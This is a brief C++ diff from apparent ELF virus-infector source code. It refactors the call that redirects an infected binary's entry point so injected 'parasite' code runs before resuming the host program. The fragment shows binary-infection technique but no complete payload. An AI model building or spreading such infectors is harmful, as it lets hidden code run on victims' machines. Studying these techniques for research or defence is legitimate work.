@@ -165,8 +165,8 @@ bool PaddingInfector::inject(std::span<std::byte> host_mapping,
 
   // Patch parasite to resume host code after execution.
   return common::redirect_elf_entry_point(
-      ehdr.e_type, original_entry_point_, parasite_load_address_,
-      parasite_file_offset_, parasite_mapping.size(), host_mapping);
+      original_entry_point_, parasite_load_address_, parasite_file_offset_,
+      parasite_mapping.size(), host_mapping);
 }
 
 }  // namespace vt::infector
